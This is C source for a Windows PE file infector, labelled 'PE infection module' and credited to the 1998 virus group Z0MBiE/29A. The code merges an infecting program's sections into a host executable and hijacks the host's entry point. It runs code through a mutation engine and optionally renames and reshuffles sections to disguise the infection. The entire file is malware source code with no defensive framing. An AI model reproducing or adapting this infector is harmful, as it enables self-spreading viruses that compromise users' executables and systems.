
// INFECT.C - PE infection module
// Copyright (C) 1998 Z0MBiE/29A

byte code_buf[max_code_size];   // output buffer for mutated code

#define ALIGNED(addr, align)    (((addr) + (align) - 1) & (~((align) - 1)))

mzheader mz;
peheader pe_A;
peheader pe_B;

#define  max_obj_num_A 64
#define  our_sections   4               // max!
dword    objnum_A;
objentry objtable_A[max_obj_num_A];

#define  max_obj_num_B 64
dword    objnum_B;
objentry objtable_B[max_obj_num_B];

dword    max;
byte     buf[8192];

dword    rva;

dword    pe_pos_A;
dword    objtable_pos_A;


        #ifdef   RENAME_SECTIONS

#define c_max 6

char c_str[c_max][16] =
  {".text",
   ".TEXT",
   ".code",
   ".CODE",
   "code",
   "CODE"};

#define d_max 9

char d_str[d_max][16] =
  {".data",
   ".DATA",
   "data",
   "DATA",
   "BSS",
   "bss",
   ".BSS",
   ".bss",
   ".CRT"};

        #endif

void copyfile(handle I, handle O, dword Ipos, dword Opos, dword size)
  {
    seek(I, Ipos);
    seek(O, Opos);
    while (size > 0)
      {
        max = MIN(sizeof(buf), size);
        readfile(I, buf, max);
        writefile(O, buf, max);
        size -= max;
      }
  }

void run_infect(pchar file_A, pchar file_B, pchar file_C)
  {
    handle A,B,C;
    dword i,j,a,b;
    dword d;

    printf("job: %a + %a = %a\n", file_A, file_B, file_C);

    A = openfile_ro(file_A);
    B = openfile_ro(file_B);
    C = createfile(file_C);

//---------------------------------------------------------------------------

    printf("processing %a\n", file_A);

    max = readfile(A, &mz, sizeof(mzheader));

    if ( (mz.id != 'MZ') || (max != sizeof(mzheader)) )
      {
        printf("error in old exe header\n");
        goto exit;
      }

    if ( (mz.relnum != 0) && (mz.relofs <= sizeof(mzheader)) )
      {
        printf("PE header not found in this file\n");
        goto exit;
      }

    seek(A, mz.neptr);
    pe_pos_A = filepos(A);
    max = readfile(A, &pe_A, sizeof(peheader));

    if ( (pe_A.id != 'PE') || (max != sizeof(peheader)) )
      {
        printf("error reading new exe header - PE not found\n");
        goto exit;
      }

    if ((pe_A.cputype < 0x014C) ||
        (pe_A.cputype > 0x014E))
      {
        printf("wrong pe_A.cputype value\n");
        goto exit;
      }

    objnum_A = pe_A.numofobjects;
    if ((objnum_A == 0) || (objnum_A > (max_obj_num_A-our_sections)))
      {
        printf("numofobjects error (0 or too many)");
        goto exit;
      }

    if (pe_A.ntheadersize != (0xF8-0x18))
      {
        printf("*** WARNING ***: ntheadersize\n");
        seek(A, 0x18 + pe_A.ntheadersize);    // correct obj table ptr
      }

    if (((pe_A.flags & 0x0002) == 0) ||    // executable
        ((pe_A.flags & 0x2001) != 0) ||    // dll | fixed
        (pe_A.dllflags != 0))
      {
        printf("pe_A.flags or pe.dllflags error\n");
        goto exit;
      }

    if (pe_A.magic != 0x010B)
      {
        printf("pe_A.magic error\n");
        goto exit;
      }

    if ((pe_A.subsystem != 2) && (pe_A.subsystem != 3))  // Windows GUI/char
      {
        printf("pe_A.subsystem error\n");
        goto exit;
      }

    if (pe_A.imagebase != 0x00400000)
      {
        printf("*** WARNING ***: pe_A.imagesize\n");
      }

    objtable_pos_A = filepos(A);
    readfile(A, objtable_A, objnum_A * sizeof(objentry));

    if ( (ALIGNED(filepos(A), pe_A.filealign) - filepos(A)) <
         (our_sections * sizeof(objentry)) )
      {
        printf("No free space in objecttable\n");
        goto exit;
      }

//---------------------------------------------------------------------------

    printf("processing %a\n", file_B);

    readfile(B, &mz, sizeof(mzheader));
    seek(B, mz.neptr);
    readfile(B, &pe_B, sizeof(peheader));

    if (pe_B.ntheadersize != (0xF8-0x18))
      {
        printf("*** WARNING ***: ntheadersize\n");
        seek(A, 0x18 + pe_B.ntheadersize);    // correct obj table ptr
      }

    objnum_B = pe_B.numofobjects;
    readfile(B, &objtable_B, max_obj_num_B * sizeof(objentry));

//---------------------------------------------------------------------------

    j = 0;
    for (i=0; i<objnum_B; i++)
      if (objtable_B[i].reserved[0] == 0) j++;
    if (j == objnum_B)  // 1st start - mark sections
      {
        for (i=0; i<objnum_B;i++)
          if (!cmp(&objtable_B[i].name, ".debug", 7))
          if (!cmp(&objtable_B[i].name, ".idata", 7))   // YES !!!
            objtable_B[i].reserved[0] = 'Z';
      };

retry:
    for (i=0; i<objnum_B; i++)
      if (objtable_B[i].reserved[0] != 'Z')
        {
          move(&objtable_B[objnum_B-1],
               &objtable_B[i],
               sizeof(objentry));
          objnum_B--;
          goto retry;
        }

   // for (i=0; i<objnum_B;i++)
   //    objtable_B[i].name[0] = '_';

//---------------------------------------------------------------------------

    rva = 0;
    for (i=0; i<objnum_A; i++)
      {
        j = objtable_A[i].sectionrva +
            objtable_A[i].virtualsize;
        rva = MAX(rva, j);
      }
    rva = ALIGNED(rva, pe_A.objectalign);

    for (i=0; i<objnum_B; i++)
      {
        objtable_B[i].sectionrva =
        objtable_B[i].sectionrva + pe_B.imagebase - pe_A.imagebase;

        if (objtable_B[i].sectionrva < rva)
          {
            printf("RVA fixing error");
            goto exit;
          }

        if (pe_A.imagesize + objtable_B[i].sectionrva > 0x80000000)
          {
            printf("some rva > 0x80000000, cant infect file\n");
            goto exit;
          }

      }

    save_entrypoint = pe_A.imagebase + pe_A.entrypointrva;

    pe_A.entrypointrva =
      pe_B.entrypointrva + pe_B.imagebase - pe_A.imagebase;

//---------------------------------------------------------------------------

    printf("copying %a to %a\n", file_A, file_C);

    copyfile(A, C, 0, 0, filesize(A));

//---------------------------------------------------------------------------

    printf("copying sections\n");

    seek(C, filesize(C));

    #ifdef RESORT_MY_SECTIONS

    a = rnd(objnum_B);
    b = random();

    #endif

    for (j=0; j<objnum_B; j++)
      {
        #ifdef RESORT_MY_SECTIONS
        i = ((j ^ a) + b) % objnum_B;
        #else
        i = j;
        #endif

        move(&objtable_B[i],
             &objtable_A[objnum_A],
             sizeof(objentry));

        objtable_A[objnum_A].physicaloffset =
          ALIGNED(filepos(C), pe_A.filealign);

        seek(C, objtable_A[objnum_A].physicaloffset);
        d = objtable_B[i].sectionrva - // relocate BACK, what the sux...
          pe_B.imagebase + pe_A.imagebase +
          pe_B.imagebase;

        if ((objtable_B[i].objectflags & 0x20) != 0)  // code?
          {
            run_engine((pchar) d, (pchar) &code_buf, objtable_B[i].physicalsize);
            writefile(C, &code_buf, objtable_B[i].physicalsize);
           }
        else
          writefile(C, (voidptr) d, objtable_B[i].physicalsize);

        objnum_A++;
      }

    printf("patching header/objecttable\n");

    pe_A.numofobjects = objnum_A;

    pe_A.flags |= 0x0001;   // fixed = relocs. stripped
    pe_A.fixuprva = 0;
    pe_A.fixupsize = 0;

    pe_A.checksum = 0;

    #ifdef REDEFINE_SUBSYSTEM
    pe_A.subsystem = 3;            // char
    #endif

    for (i=0; i<objnum_A; i++)
      {
        if (cmp(&objtable_A[i].name, ".reloc", 7))
          {
            // printf(".reloc killed\n");
            objtable_A[i].objectflags |= 0x800;
          }
      }

    for (i=0; i<objnum_B; i++)
      {
        j = ALIGNED(objtable_B[i].virtualsize, pe_A.objectalign);

        if ((objtable_B[i].objectflags & 0x20) != 0)
          pe_A.sizeofcode  += j;
        if ((objtable_B[i].objectflags & 0x40) != 0)
          pe_A.sizeofidata += j;
        if ((objtable_B[i].objectflags & 0x80) != 0)
          pe_A.sizeofudata += j;
      }

    max = 0;
    for (i=0; i<objnum_A;i++)
      max = MAX(max,
          objtable_A[i].sectionrva +
          ALIGNED(objtable_A[i].virtualsize,pe_A.objectalign)  );
    pe_A.imagesize = max;

    // change section names

#define NAMELEN(str)         (MAX(strlen((str)), 8))

    #ifdef      RENAME_SECTIONS

    for (i=0; i<objnum_A;i++)
      {
        for (j=0; j<c_max; j++)
          {
            if (cmp(&objtable_A[i].name, c_str[j], NAMELEN(c_str[j])))
              {
                j = rnd(c_max);
               // printf("code: %a -> %a\n", objtable_A[i].name,c_str[j]);
                move(&c_str[j], &objtable_A[i].name, NAMELEN(c_str[j]));
                goto skip_j;
              }
            if (cmp(&objtable_A[i].name, d_str[j], NAMELEN(d_str[j])))
              {
                j = rnd(d_max);
               // printf("data: %a -> %a\n", objtable_A[i].name,d_str[j]);
                move(&d_str[j], &objtable_A[i].name, NAMELEN(d_str[j]));
                goto skip_j;
              }
          } // for j
skip_j:
      } // for i

    #endif

    #ifdef RESORT_OBJTABLE

    for (max=0; max<1000; max++)
      {
        i = rnd(objnum_A);
        j = rnd(objnum_A);
        move(&objtable_A[i], &objtable_B[0], sizeof(objentry));
        move(&objtable_A[j], &objtable_A[i], sizeof(objentry));
        move(&objtable_B[0], &objtable_A[j], sizeof(objentry));
      }

    #endif

    seek(C, pe_pos_A);
    writefile(C, &pe_A, 0x18+pe_A.ntheadersize );

    seek(C, objtable_pos_A);
    writefile(C, objtable_A, objnum_A * sizeof(objentry));

//---------------------------------------------------------------------------

exit:
    closefile(A);
    closefile(B);
    closefile(C);

  }

